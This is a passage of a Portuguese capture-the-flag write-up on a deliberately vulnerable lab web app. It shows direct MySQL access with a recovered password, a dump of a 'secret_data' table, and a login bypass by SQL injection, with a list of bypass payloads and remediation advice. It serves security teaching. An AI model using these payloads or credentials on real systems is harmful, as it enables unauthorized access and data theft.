20. Implementar MFA (Multi-Factor Authentication) para contas administrativas
21. Criar política de senhas fortes com enforcement técnico (mínimo 12 caracteres, complexidade)
22. Implementar rotação automática de credenciais de banco de dados
23. Segregar rede do banco de dados com VLAN isolada e firewall interno
24. Configurar MySQL audit plugin para rastrear todas as operações de acesso a dados
25. Remover ou proteger views, stored procedures e triggers desnecessários

**AÇÕES DE LONGO PRAZO (Próximo mês):**
26. Obter certificação de segurança (ISO 27001, SOC 2)
27. Implementar SSDLC (Secure Software Development Lifecycle)
28. Treinar equipe de desenvolvimento em secure coding (OWASP Top 10, SQL Injection)
29. Implementar code review obrigatório com foco em segurança
30. Estabelecer programa de bug bounty para descoberta responsável de vulnerabilidades
31. Implementar database activity monitoring (DAM) em tempo real
32. Criar plano de resposta a incidentes e disaster recovery
33. Realizar auditorias de segurança trimestrais
34. Implementar principle of least privilege em toda a infraestrutura
35. Migrar para arquitetura de microsserviços com isolamento de dados

**Impacto Regulatório e Conformidade:**

**Violações Identificadas:**
- **LGPD (Art. 46, 47, 48)**: Falha em implementar medidas de segurança adequadas para proteção de dados pessoais
- **GDPR (Art. 32)**: Ausência de medidas técnicas apropriadas (criptografia de senhas)
- **PCI DSS v4.0 (Req. 6.2)**: SQL Injection em aplicação que pode processar pagamentos
- **ISO 27001 (A.9.4.3)**: Sistema de gerenciamento de senhas inadequado
- **NIST Cybersecurity Framework**: Falhas em Identify, Protect e Detect

**Obrigações Legais:**
- Notificação à ANPD (Autoridade Nacional de Proteção de Dados) em até 72 horas
- Notificação aos titulares de dados afetados
- Documentação completa do incidente e medidas corretivas
- Possível designação de encarregado de proteção de dados (DPO)

**Penalidades Potenciais:**
- Multa LGPD: até R$ 50 milhões ou 2% do faturamento anual
- Multa GDPR: até €20 milhões ou 4% do faturamento global anual
- Suspensão de atividades de tratamento de dados
- Proibição de tratamento de dados pessoais
- Processos judiciais de clientes e usuários afetados
- Dano reputacional e perda de confiança do mercado

**Lições Aprendidas e Boas Práticas:**

1. **Defense in Depth**: Múltiplas camadas de segurança previnem exploração mesmo quando uma falha existe
2. **Principle of Least Privilege**: Usuários de banco devem ter apenas permissões estritamente necessárias
3. **Never Trust User Input**: Todo input deve ser validado, sanitizado e parametrizado
4. **Security by Design**: Segurança deve ser considerada desde a fase de design, não como afterthought
5. **Regular Security Audits**: Pentests regulares identificam vulnerabilidades antes de atacantes
6. **Proper Secret Management**: Nunca hardcode flags, tokens ou credenciais em código ou banco
7. **Access Control**: Serviços administrativos (phpMyAdmin) nunca devem estar expostos publicamente
8. **Password Security**: Sempre usar hashing forte (bcrypt/Argon2) e nunca armazenar senhas em texto claro

<p align="right">
  <a href="#topo" style="text-decoration: none; background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px;">Voltar ao Topo</a>
</p>

---

### <a name="flag-8-admin-dashboard-access"></a>Flag 8: Hidden Database Data

#### Conceito: Dados Ocultos na Tabela Secret_Data

A descoberta de dados ocultos em tabelas de banco de dados (Hidden Database Data) representa uma vulnerabilidade que ocorre quando informações sensíveis, segredos, tokens, chaves de API, ou configurações críticas são armazenadas em tabelas específicas do banco de dados sem criptografia adequada, controles de acesso rigorosos, ou segregação apropriada. Tabelas como `secret_data`, `secrets`, `config`, `settings`, ou `credentials` são alvos primários em ataques de pentest, pois frequentemente contêm o "cofre de segredos" da aplicação - informações que, se comprometidas, permitem acesso completo a sistemas integrados, APIs de terceiros, e funcionalidades críticas. Esta prática de centralizar segredos em uma única tabela de banco de dados, embora conveniente para desenvolvedores, viola princípios fundamentais de segurança como defense in depth e separation of concerns. Em ambientes modernos, segredos devem ser gerenciados através de soluções especializadas (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault) que fornecem criptografia, rotação automática, auditoria detalhada e controle de acesso granular. A exposição de tabelas de segredos permite que atacantes: obtenham tokens de API para serviços externos, descubram caminhos de backups para exfiltração, identifiquem flags administrativas, e comprometam integrações com sistemas de terceiros. Esta vulnerabilidade se enquadra em A02:2021 (Cryptographic Failures - por não criptografar dados sensíveis em repouso), A04:2021 (Insecure Design - por design arquitetural inadequado de gestão de segredos), e violações de compliance como PCI DSS Requisito 3 (proteção de dados armazenados) e LGPD Art. 46 (medidas de segurança técnicas).

#### Passo 1: Conexão Direta ao Banco de Dados MySQL via Terminal

Aproveitando as credenciais de banco de dados anteriormente comprometidas, foi estabelecida uma conexão direta ao servidor MySQL através do cliente de linha de comando com o comando `mysql -u techcorp_user -h 98.95.207.28 -p --skip-ssl`. Analisando os parâmetros: `-u techcorp_user` especifica o nome do usuário para autenticação, `-h 98.95.207.28` define o hostname/IP do servidor MySQL remoto, `-p` instrui o cliente a solicitar a senha interativamente (evitando exposição em histórico de comandos), e `--skip-ssl` desabilita a conexão SSL/TLS (uma configuração insegura mas comum em ambientes mal configurados). Após inserir a senha `T3chC0rp_S3cr3t_2024!`, a conexão foi estabelecida com sucesso, retornando "Welcome to the MariaDB monitor" e informações do servidor: **MySQL connection id: 48255** (indicando alto número de conexões anteriores), **Server version: 8.0.44 MySQL Community Server - GPL**. O prompt mudou para `MySQL [(none)]>`, indicando que nenhum banco de dados foi selecionado inicialmente. Esta conexão direta ao banco de dados representa um acesso privilegiado que bypassa completamente a camada de aplicação web, permitindo manipulação direta de dados sem logs adequados na aplicação, validações de negócio, ou controles de autorização implementados no código.

**Evidências do Passo 1:**
- Screenshot do comando `mysql -u techcorp_user -h 98.95.207.28 -p --skip-ssl`
- Prompt de senha e mensagem "Welcome to the MariaDB monitor"
- Informações do servidor: MySQL 8.0.44, connection id 48255
- Prompt MySQL [(none)]> pronto para comandos

#### Passo 2: Enumeração de Bancos de Dados Disponíveis

Uma vez conectado ao servidor MySQL, o primeiro passo de reconhecimento foi enumerar todos os bancos de dados acessíveis pelo usuário `techcorp_user` através do comando SQL `show databases;`. Este comando é fundamental em qualquer exploração de banco de dados, pois revela o escopo completo de acesso concedido ao usuário. A query retornou 3 bancos de dados em 0.135 segundos: **information_schema** (banco de dados sistema do MySQL contendo metadados sobre todos os outros bancos, tabelas, colunas, privilégios e estruturas - essencial para enumeração avançada), **performance_schema** (banco de dados sistema para monitoramento de performance do MySQL, contendo estatísticas de execução de queries e uso de recursos), e **techcorp_db** (o banco de dados de produção da aplicação contendo todos os dados corporativos). A presença de acesso ao `information_schema` é particularmente preocupante, pois permite ao atacante enumerar completamente a estrutura de dados, identificar colunas sensíveis, entender relacionamentos entre tabelas, e até mesmo descobrir stored procedures, triggers e views (como já foi explorado anteriormente). O tempo de resposta rápido (135ms) indica boa conectividade de rede e ausência de rate limiting ou detecção de intrusão no nível de banco de dados.

**Evidências do Passo 2:**
- Screenshot do comando `show databases;` executado
- Listagem dos 3 bancos de dados: information_schema, performance_schema, techcorp_db
- Tempo de execução: 0,135 segundos
- Confirmação de acesso ao information_schema (risco elevado)

#### Passo 3: Seleção e Enumeração de Tabelas do Banco Techcorp_DB

Após identificar o banco de produção `techcorp_db`, foi executada a seleção explícita através do comando `use techcorp_db;` (implícito no contexto), seguido por `show tables;` para listar todas as tabelas disponíveis. A enumeração revelou 5 tabelas em 0.136 segundos: **clients** (provavelmente contendo informações de clientes corporativos, dados de contato, contratos), **contacts** (dados de contatos, formulários de contato, mensagens), **secret_data** (tabela crítica contendo segredos, tokens e configurações sensíveis - alvo primário), **sensitive_info** (a view anteriormente explorada que expõe credenciais administrativas), e **users** (já explorada, contendo 18 usuários com senhas em texto claro). O prompt mudou para `MySQL [techcorp_db]>`, confirmando a seleção do banco de dados. A presença de uma tabela explicitamente nomeada `secret_data` é um indicador crítico de má prática de segurança - nomenclatura descritiva que revela a natureza sensível do conteúdo facilita enormemente o trabalho de atacantes. Em design seguro, tabelas sensíveis deveriam ter nomes neutros ou ofuscados, além de estarem em schemas separados com controles de acesso rigorosos.

**Evidências do Passo 3:**
- Screenshot do comando `show tables;` no banco techcorp_db
- Listagem das 5 tabelas com destaque para secret_data
- Prompt alterado para MySQL [techcorp_db]> confirmando seleção do banco
- Tempo de execução: 0,136 segundos

#### Passo 4: Extração Completa de Dados da Tabela Secret_Data

O passo crítico foi a execução da query `select * from secret_data;` para extrair todos os registros da tabela de segredos. A query retornou **4 registros** em 0.133 segundos, revelando uma estrutura de tabela com 4 colunas: **id** (chave primária), **secret_key** (identificador do tipo de segredo), **secret_value** (o valor do segredo em si), e **created_at** (timestamp de criação). A análise dos 4 registros revelou informações extremamente críticas:

**Registro 1 (ID: 1):**
- secret_key: `database_flag`
- secret_value: `FLAG{sql_1nj3ct10n_m4st3r}`
- created_at: 2025-11-17 14:30:36
- Significado: Flag relacionada à exploração de SQL Injection realizada anteriormente

**Registro 2 (ID: 2) - FLAG CAPTURADA:**
- secret_key: `admin_token`
- secret_value: `FLAG{h1dd3n_d4t4_1n_d4t4b4s3}`
- created_at: 2025-11-17 14:30:36
- Significado: **Flag principal desta exploração**, rotulada como "admin_token" sugerindo que representa um token administrativo

**Registro 3 (ID: 3) - CRÍTICO:**
- secret_key: `api_secret`
- secret_value: `sk_prod_A7x9mP2qR5tY8wZ3vC6nB4jK1lM0hG`
- created_at: 2025-11-17 14:30:36
- Significado: Chave de API de produção (prefixo `sk_prod_` indica Stripe ou similar), permitindo acesso a serviços de pagamento ou APIs de terceiros

**Registro 4 (ID: 4) - INFORMAÇÃO SENSÍVEL:**
- secret_key: `backup_path`
- secret_value: `/var/backups/techcorp/backup_20240115.tar.gz`
- created_at: 2025-11-17 14:30:36
- Significado: Caminho completo do backup do sistema, permitindo tentativas de exfiltração ou download

Todos os 4 registros foram criados no mesmo timestamp (2025-11-17 14:30:36), sugerindo que foram inseridos durante a inicialização/setup do banco de dados, possivelmente através de script de seed ou migração inicial. A exposição destes dados representa comprometimento total da camada de segredos da aplicação.

**Evidências do Passo 4:**
- Screenshot completo da query `select * from secret_data;`
- Tabela formatada mostrando os 4 registros com todas as colunas
- Destaque para o registro ID 2 contendo FLAG{h1dd3n_d4t4_1n_d4t4b4s3}
- Destaque para o api_secret de produção (ID 3)
- Visualização do backup_path (ID 4)
- Tempo de execução: 0,133 segundos

**Flag Capturada:** `FLAG{h1dd3n_d4t4_1n_d4t4b4s3}`

**Data da Captura:** 27 de novembro de 2025

**Análise Detalhada dos Segredos Comprometidos:**

<p align="right">
  <a href="#topo" style="text-decoration: none; background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px;">Voltar ao Topo</a>
</p>

**1. Database Flag (ID: 1):**
- **Tipo**: Flag de CTF
- **Valor**: FLAG{sql_1nj3ct10n_m4st3r}
- **Impacto**: Baixo (apenas para challenge)
- **Nota**: Confirma que SQL Injection foi vetor de acesso intencional do CTF

**2. Admin Token (ID: 2) - FLAG PRINCIPAL:**
- **Tipo**: Flag de CTF rotulada como token administrativo
- **Valor**: FLAG{h1dd3n_d4t4_1n_d4t4b4s3}
- **Impacto**: Médio (se fosse token real, permitiria bypass de autenticação)
- **Vulnerabilidade**: Armazenamento de token em texto claro sem criptografia

**3. API Secret (ID: 3) - CRÍTICO:**
- **Tipo**: Chave de API de produção (possivelmente Stripe, AWS, ou serviço similar)
- **Valor**: sk_prod_A7x9mP2qR5tY8wZ3vC6nB4jK1lM0hG
- **Formato**: Padrão Stripe (sk_prod_ = secret key production)
- **Impacto**: CRÍTICO - Se válida, permite:
  - Acesso completo à API de pagamentos
  - Criação de transações fraudulentas
  - Exfiltração de dados de cartões de crédito (se armazenados)
  - Reembolsos não autorizados
  - Modificação de configurações de conta
- **Violação**: PCI DSS Requirement 3.5, 3.6 (proteção de chaves criptográficas)

**4. Backup Path (ID: 4) - SENSÍVEL:**
- **Tipo**: Caminho de arquivo de backup do sistema
- **Valor**: /var/backups/techcorp/backup_20240115.tar.gz
- **Data do Backup**: 15 de janeiro de 2024 (quase 1 ano desatualizado)
- **Impacto**: ALTO - Permite:
  - Tentativa de download via LFI (Local File Inclusion)
  - Identificação de estrutura de diretórios do servidor
  - Potencial exfiltração de backup completo do sistema
  - Análise offline de código-fonte e banco de dados histórico
- **Nota**: Backup desatualizado sugere falta de política de backup regular

**Vulnerabilidades Críticas Identificadas:**

**1. Armazenamento de Segredos em Texto Claro (CWE-312):**
- Nenhum dos segredos está criptografado
- Qualquer acesso ao banco expõe todos os segredos simultaneamente
- Violação de princípios de criptografia de dados em repouso

**2. Nomenclatura Descritiva de Tabela Sensível (CWE-200):**
- Nome "secret_data" facilita identificação por atacantes
- Melhor prática: usar nomes neutros ou ofuscados

**3. Ausência de Segregação de Segredos (CWE-653):**
- Todos os segredos em uma única tabela
- Não há separação por nível de sensibilidade ou contexto
- Violação do princípio de compartimentalização

**4. Falta de Auditoria e Logging (CWE-778):**
- Sem triggers de auditoria na tabela secret_data
- Acessos diretos ao banco não são logados adequadamente
- Impossibilita detecção de acessos não autorizados

**5. API Key em Banco de Dados (CWE-798):**
- Chaves de API nunca devem estar em banco de dados
- Devem ser gerenciadas por vault ou secrets manager
- Rotação impossível sem alteração de banco de dados

**6. Exposição de Caminho de Backup (CWE-538):**
- Revelação de estrutura de filesystem do servidor
- Facilita ataques de exfiltração de dados
- Violação de princípio de least information disclosure

**Impacto Potencial da Exploração:**

**1. Comprometimento de Integração com APIs:**
- Uso indevido da chave sk_prod_A7x9mP2qR5tY8wZ3vC6nB4jK1lM0hG
- Criação de transações fraudulentas
- Exfiltração de dados de clientes do serviço de API
- Custo financeiro direto para a organização

**2. Exfiltração de Backups:**
- Tentativa de download de /var/backups/techcorp/backup_20240115.tar.gz
- Análise offline revelando código-fonte, configurações, dados históricos
- Descoberta de vulnerabilidades adicionais no código

**3. Bypass de Autenticação:**
- Se admin_token fosse token real, permitiria acesso administrativo direto
- Bypass completo de mecanismos de autenticação da aplicação

**4. Escalonamento de Privilégios:**
- Combinação de múltiplos segredos permite acesso a diferentes sistemas
- Movimentação lateral na infraestrutura

**Classificação de Severidade:**

**CVSS 3.1 Score: 8.1 (ALTO)**
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: Low (PR:L) - requer credenciais de banco
- User Interaction: None (UI:N)
- Scope: Unchanged (S:U)
- Confidentiality Impact: High (C:H)
- Integrity Impact: High (I:H)
- Availability Impact: None (A:N)

**Classificação CWE:**
- CWE-312: Cleartext Storage of Sensitive Information
- CWE-798: Use of Hard-coded Credentials
- CWE-200: Exposure of Sensitive Information to Unauthorized Actor
- CWE-326: Inadequate Encryption Strength (ausência de criptografia)
- CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory
- CWE-653: Insufficient Compartmentalization

**Classificação OWASP Top 10 2021:**
- A02:2021 - Cryptographic Failures (ausência de criptografia)
- A04:2021 - Insecure Design (design inadequado de gestão de segredos)
- A05:2021 - Security Misconfiguration (tabela acessível sem proteção)
- A07:2021 - Identification and Authentication Failures (tokens expostos)

**Recomendações Críticas de Remediação:**

**AÇÕES IMEDIATAS (Próximas 2 horas):**
1. **URGENTE**: Revogar e regenerar a chave de API `sk_prod_A7x9mP2qR5tY8wZ3vC6nB4jK1lM0hG` imediatamente
2. **URGENTE**: Auditar logs da API para identificar uso não autorizado da chave comprometida
3. **URGENTE**: Mover arquivo de backup /var/backups/techcorp/backup_20240115.tar.gz para local seguro
4. **URGENTE**: Alterar permissões do usuário techcorp_user para DENY em secret_data
5. **URGENTE**: Implementar trigger de auditoria na tabela secret_data registrando todos os acessos

**AÇÕES DE CURTO PRAZO (Próximas 24-48 horas):**
6. Migrar todos os segredos para solução de secrets management (HashiCorp Vault, AWS Secrets Manager)
7. Implementar criptografia de dados em repouso para secret_data usando MySQL TDE (Transparent Data Encryption)
8. Criptografar valores da coluna secret_value usando AES-256 até migração completa
9. Renomear tabela secret_data para nome neutro (ex: application_config)
10. Implementar rotação automática de API keys com políticas de expiração
11. Criar stored procedure segura para acesso a secret_data com logging
12. Revocar acesso direto ao banco, forçar acesso apenas via aplicação
13. Implementar row-level security (RLS) limitando acesso por contexto de usuário
14. Configurar alertas para queries SELECT na tabela de segredos
15. Realizar varredura completa de código-fonte buscando hardcoded secrets (truffleHog, git-secrets)

**AÇÕES DE MÉDIO PRAZO (Próximas 1-2 semanas):**
16. Implementar segregação de segredos por ambiente (dev/staging/prod) em vaults separados
17. Criar política de ciclo de vida de segredos com rotação obrigatória trimestral
18. Implementar princípio de least privilege: cada aplicação acessa apenas segredos necessários
19. Configurar database audit logging nível enterprise (MySQL Enterprise Audit)
20. Implementar monitoramento em tempo real de acessos à tabela de segredos (SIEM)
21. Criar backup incremental diário com criptografia AES-256 e teste de restore mensal
22. Remover caminho de backup da tabela, usar variáveis de ambiente ou vault
23. Implementar API key rotation automática via orchestration (Terraform, Ansible)
24. Configurar webhook de notificação quando API key é regenerada
25. Criar dashboard de segurança monitorando uso de segredos e tentativas de acesso

**AÇÕES DE LONGO PRAZO (Próximo mês):**
26. Migrar para arquitetura de serviços gerenciados (AWS RDS com Secrets Manager integration)
27. Implementar zero-trust architecture com acesso just-in-time aos segredos
28. Certificar conformidade com PCI DSS para proteção de chaves criptográficas
29. Treinar equipe em secure secrets management e OWASP practices
30. Implementar DevSecOps pipeline com scanning automático de segredos em commits
31. Criar runbook de resposta a incidente para exposição de segredos
32. Estabelecer SLA de rotação de segredos: <4 horas após detecção de comprometimento
33. Implementar chaos engineering testando resposta a comprometimento de segredos
34. Obter certificação ISO 27001 para gestão de segurança da informação
35. Realizar pentest focado em secrets management trimestralmente

**Impacto Regulatório e Compliance:**

**Violações Específicas:**
- **PCI DSS v4.0 Requirement 3**: Proteção de dados armazenados - API key sem criptografia
- **PCI DSS Requirement 3.5**: Chaves criptográficas protegidas contra disclosure e misuse
- **PCI DSS Requirement 8.3**: MFA e controles fortes para acesso administrativo
- **LGPD Art. 46**: Adoção de medidas de segurança técnicas e administrativas
- **GDPR Art. 32**: Criptografia de dados pessoais (se API conecta a dados pessoais)
- **NIST SP 800-53 SC-12**: Estabelecimento e gestão de chaves criptográficas
- **ISO 27001 A.10.1**: Políticas de uso de controles criptográficos

**Obrigações Imediatas:**
- Notificar provedor da API (Stripe, etc.) sobre comprometimento de chave
- Documentar timeline de exposição para compliance audit
- Avaliar se dados pessoais foram acessados (notificação ANPD/GDPR se sim)
- Implementar plano de remediação com prazos documentados

**Penalidades Potenciais:**
- Stripe: Suspensão de conta por violação de TOS (Terms of Service)
- PCI DSS: Multas de $5.000 a $100.000 por mês até conformidade
- LGPD: Multa de até R$ 50 milhões ou 2% do faturamento
- GDPR: Multa de até €10 milhões ou 2% do faturamento global
- Perda de certificação PCI DSS impedindo processamento de cartões

**Comparação com Melhores Práticas da Indústria:**

**Atual (Inseguro):**
```sql
-- Tabela secret_data com valores em texto claro
SELECT secret_value FROM secret_data WHERE secret_key = 'api_secret';
-- Retorna: sk_prod_A7x9mP2qR5tY8wZ3vC6nB4jK1lM0hG
```

**Recomendado (Seguro):**
```python
# Aplicação busca segredo do AWS Secrets Manager
import boto3
client = boto3.client('secretsmanager')
secret = client.get_secret_value(SecretId='prod/stripe/api_key')
# Segredo nunca toca banco de dados da aplicação
# Auditoria completa no CloudTrail
# Rotação automática configurada
# Acesso restrito por IAM policies
```

**Lições Aprendidas Críticas:**

1. **Never Store Secrets in Databases**: Bancos de dados não são cofres de segredos adequados
2. **Use Dedicated Secrets Management**: Vault, Secrets Manager, Key Vault são purpose-built
3. **Encrypt Data at Rest**: Dados sensíveis sempre criptografados, mesmo em banco
4. **Implement Secret Rotation**: Segredos devem ter lifecycle com rotação automática
5. **Audit All Access**: Logs detalhados de quem acessa segredos e quando
6. **Principle of Least Privilege**: Limitar acesso a segredos ao mínimo necessário
7. **Never Hardcode Secrets**: Nem em código, nem em banco, nem em arquivos de config
8. **Test Incident Response**: Simular cenários de comprometimento regularmente

---

### <a name="flag-9-sql-injection"></a>Flag 9: SQL Injection Master

#### SQL Injection: Da Sondagem à Exfiltração
<a href="#" target="_blank"><img style="margin: 10px" height="700" width="800" src="/doc/img/infor2.png" alt="SQL Injection: Da Sondagem à Exfiltração"/></a>

#### Conceito: SQL Injection no Sistema de Login

SQL Injection (SQLi) é uma das vulnerabilidades de segurança mais críticas e prevalentes em aplicações web, classificada como **A03:2021 - Injection** no OWASP Top 10. Esta vulnerabilidade ocorre quando uma aplicação constrói consultas SQL dinamicamente concatenando diretamente a entrada do usuário sem validação, sanitização ou parametrização adequadas, permitindo que atacantes injetem código SQL malicioso que é executado pelo banco de dados. Em sistemas de login, SQL Injection é particularmente devastadora porque permite **bypass completo de autenticação** - um atacante pode fazer login como qualquer usuário (incluindo administradores) sem conhecer a senha, simplesmente manipulando a lógica da query SQL. O ataque clássico envolve o uso de operadores lógicos SQL como `OR`, predicados sempre verdadeiros como `'1'='1'`, e caracteres especiais como aspas simples (`'`) para "escapar" da string original e injetar lógica SQL adicional. Por exemplo, quando um desenvolvedor cria uma query como `SELECT * FROM users WHERE username='$input_user' AND password='$input_pass'`, um atacante pode inserir `admin' OR '1'='1` no campo username, transformando a query em `SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='...'`, que retorna verdadeiro independentemente da senha. Esta vulnerabilidade viola múltiplos princípios de segurança: falha em validar input do usuário (OWASP Input Validation), ausência de prepared statements (secure coding), e falta de defense in depth. SQL Injection pode resultar em: bypass de autenticação, exfiltração completa de dados (data breach), modificação ou deleção de dados, execução de comandos no sistema operacional (via xp_cmdshell no MSSQL ou sys_exec no MySQL UDF), e até comprometimento total do servidor. Em termos de compliance, SQL Injection representa violação grave de: PCI DSS Requirement 6.5.1 (proteção contra injection flaws), OWASP ASVS V5 (Validation, Sanitization and Encoding), ISO 27001 A.14.2.5 (secure coding), e LGPD Art. 46 (medidas de segurança técnicas).

#### Passo 1: Identificação do Formulário de Login Vulnerável

O primeiro passo da exploração foi acessar a página de login da aplicação através do navegador em `http://98.95.207.28/login.php`. A análise inicial revelou um formulário HTML típico de autenticação contendo dois campos de entrada: **username** (campo de texto para nome de usuário) e **password** (campo de senha com caracteres ocultos), além de um botão **Login** para submissão do formulário. Através da inspeção do código-fonte HTML (clique direito > Inspecionar ou F12), foi possível identificar que o formulário utiliza método **POST** para enviar as credenciais, conforme esperado em implementações de login (mais seguro que GET pois não expõe credenciais na URL). A página também exibia elementos de interface corporativa da TechCorp Solutions, confirmando que este é o ponto de entrada principal para o sistema. A presença de um formulário de login sem proteções visíveis como CAPTCHA, rate limiting, ou indicadores de account lockout sugere vulnerabilidade potencial a ataques automatizados. Durante reconhecimento anterior com Nikto e Gobuster, este endpoint já havia sido identificado como `login.php (Status: 200)`, e o SQLMap confirmou que o parâmetro `username` era vulnerável a SQL Injection time-based blind e UNION-based. Esta etapa de reconhecimento é crucial pois estabelece o vetor de ataque antes de tentar exploração manual.

**Evidências do Passo 1:**
- Screenshot da página login.php mostrando formulário de autenticação
- Visualização dos campos username e password
- Interface da TechCorp Solutions com branding corporativo
- Código HTML do formulário mostrando método POST

#### Passo 2: Construção do Payload de SQL Injection para Bypass de Autenticação

Após identificar o formulário vulnerável, o próximo passo foi construir um payload de SQL Injection especificamente projetado para bypass de autenticação. O payload escolhido foi `admin' OR '1'='1`, uma técnica clássica e altamente efetiva. Para entender como funciona, é necessário analisar a query SQL presumida no backend. Quando um desenvolvedor implementa autenticação de forma insegura, tipicamente usa código como:

```php
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

Quando o atacante insere `admin' OR '1'='1` no campo username, a query se transforma em:

```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='qualquer_coisa'
```

Devido à precedência de operadores SQL (AND tem maior precedência que OR), esta query é interpretada como:

```sql
SELECT * FROM users WHERE username='admin' OR ('1'='1' AND password='qualquer_coisa')
```

Como `'1'='1'` é sempre verdadeiro, a condição OR retorna verdadeiro independentemente da senha. A query efetivamente busca: "usuário admin OU qualquer registro onde 1=1 (sempre verdadeiro)", resultando em retorno de pelo menos um registro válido. A aplicação interpeta este resultado como "login bem-sucedido" e cria sessão autenticada. O payload usa `admin'` para fechar a string do username original, `OR` para adicionar condição alternativa sempre verdadeira, e `'1'='1'` como predicado lógico tautológico (sempre true). Este é um ataque de **authentication bypass** via SQL Injection, não requerendo conhecimento da senha real.

**Evidências do Passo 2:**
- Diagrama ou explicação da transformação da query SQL
- Demonstração da lógica booleana do ataque
- Código PHP vulnerável exemplo mostrando concatenação de strings
- Análise da precedência de operadores SQL (AND vs OR)

#### Passo 3: Execução do Ataque de SQL Injection

O passo de exploração consistiu em inserir o payload malicioso nos campos do formulário e submeter a requisição. No campo **Username**, foi digitado exatamente: `admin' OR '1'='1`. É crucial notar detalhes sintáticos: a aspa simples (`'`) após "admin" fecha a string original do username na query SQL, seguida de espaço, o operador lógico `OR`, outro espaço, e a condição tautológica `'1'='1'` entre aspas simples. No campo **Password**, foi inserido qualquer valor arbitrário (por exemplo: "password", "123456", ou até mesmo deixado vazio), pois o payload no username já garante bypass completo da autenticação, tornando a validação de senha irrelevante. Após preencher ambos os campos, o botão **Login** foi clicado, submetendo a requisição POST para o servidor. A aplicação processou a entrada sem validação ou sanitização, concatenou diretamente na query SQL, executou a query modificada contra o banco de dados MySQL, e como a query retornou pelo menos um registro válido, o backend interpretou como autenticação bem-sucedida. O servidor então criou uma sessão PHP (PHPSESSID), definiu cookies de autenticação, e redirecionou o navegador para a página pós-login (provavelmente `dashboard.php` ou página interna).

**Evidências do Passo 3:**
- Screenshot do formulário preenchido mostrando `admin' OR '1'='1` no campo username
- Visualização do campo password preenchido com valor arbitrário
- Cursor sobre o botão Login prestes a submeter
- Captura da requisição HTTP POST via Developer Tools (Network tab) se disponível

#### Passo 4: Acesso Bem-Sucedido e Captura da Flag

Após submeter o payload de SQL Injection, a aplicação processou a requisição e concedeu acesso ao sistema sem validação legítima de credenciais. O navegador foi redirecionado para uma página interna (possivelmente dashboard administrativo ou página de boas-vindas) que exibia a mensagem de sucesso e, crucialmente, a flag do desafio: **FLAG{sql_1nj3ct10n_m4st3r}**. Esta flag confirma que o sistema estava intencionalmente vulnerável como parte do CTF e que o ataque de SQL Injection foi executado com sucesso. A página pós-login também pode ter exibido informações como nome do usuário logado ("Bem-vindo, admin"), menu de navegação com opções administrativas, ou dashboard com dados sensíveis. A criação de sessão autenticada permite navegação persistente no sistema como usuário admin, possibilitando acesso a funcionalidades privilegiadas, modificação de dados, ou exploração adicional da aplicação. Este acesso não autorizado representa comprometimento completo do controle de acesso da aplicação - o atacante agora possui privilégios administrativos plenos sem ter conhecimento da senha real do usuário admin (que, como descoberto anteriormente, era "admin123").

**Evidências do Passo 4:**
- Screenshot da página de sucesso mostrando FLAG{sql_1nj3ct10n_m4st3r}
- Visualização da URL mudada (possivelmente dashboard.php)
- Indicador de sessão autenticada (menu administrativo, nome de usuário exibido)
- Cookie PHPSESSID no navegador confirmando sessão ativa
- Destaque da flag capturada

**Flag Capturada:** `FLAG{sql_1nj3ct10n_m4st3r}`

**Data da Captura:** 27 de novembro de 2025

<p align="right">
  <a href="#topo" style="text-decoration: none; background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px;">Voltar ao Topo</a>
</p>

**Análise Técnica Detalhada da Vulnerabilidade:**

**Código Vulnerável (Presumido):**
```php
<?php
// login.php - Código INSEGURO com SQL Injection
$username = $_POST['username'];
$password = $_POST['password'];

// Concatenação direta sem sanitização - VULNERÁVEL!
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) > 0) {
    $_SESSION['logged_in'] = true;
    $_SESSION['username'] = $username;
    header("Location: dashboard.php");
    exit();
} else {
    echo "Login failed!";
}
?>
```

**Transformação da Query SQL:**

**Query Original (Intenção do Desenvolvedor):**
```sql
SELECT * FROM users WHERE username='admin' AND password='senha_correta'
```

**Query Após Injeção (O Que Realmente Executa):**
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='qualquer_coisa'
```

**Interpretação Lógica pelo MySQL:**
```sql
SELECT * FROM users WHERE 
    username='admin' 
    OR 
    ('1'='1' AND password='qualquer_coisa')
```

**Resultado:** Como `'1'='1'` é sempre `TRUE`, e existe operador `OR`, toda a condição WHERE retorna `TRUE`, fazendo a query retornar todos os registros da tabela ou pelo menos o primeiro registro encontrado.

**Variações Comuns do Payload:**

1. **Bypass básico com comentário:**
   - `admin'--` (comentário SQL descarta resto da query)
   - `admin'#` (MySQL comment)
   - `admin'/*` (comentário multi-linha)

2. **Bypass com OR e comentário:**
   - `' OR 1=1--`
   - `admin' OR 'a'='a'--`
   - `' OR '1'='1'--`

3. **Bypass retornando primeiro usuário:**
   - `' OR 1=1 LIMIT 1--`
   - `admin' OR 1=1--`

4. **Bypass sem conhecer username:**
   - `' OR '1'='1` (retorna primeiro usuário, geralmente admin)

**Por Que o Ataque Funciona:**

1. **Ausência de Prepared Statements**: Query construída por concatenação de strings
2. **Falta de Input Validation**: Sem validação de formato ou whitelist de caracteres permitidos
3. **Sem Sanitização**: Caracteres especiais SQL (`'`, `--`, `;`) não são escapados
4. **Lógica Booleana Manipulável**: Uso de OR permite bypass da condição de senha
5. **Precedência de Operadores**: AND tem maior precedência que OR, facilitando manipulação
6. **Ausência de WAF**: Sem Web Application Firewall detectando padrões de SQLi
7. **Error-Based Information Disclosure**: Mensagens de erro podem revelar estrutura SQL

**Impacto Real da Exploração:**

**1. Bypass Completo de Autenticação:**
- Acesso como admin sem conhecer senha
- Possibilidade de acessar qualquer conta de usuário
- Bypass de MFA se implementado apenas após autenticação SQL

**2. Acesso a Funcionalidades Privilegiadas:**
- Painel administrativo completo
- Gerenciamento de usuários (criação, modificação, deleção)
- Acesso a dados sensíveis de clientes
- Modificação de configurações do sistema

**3. Persistência:**
- Criação de contas backdoor administrativas
- Modificação de senhas de outros administradores
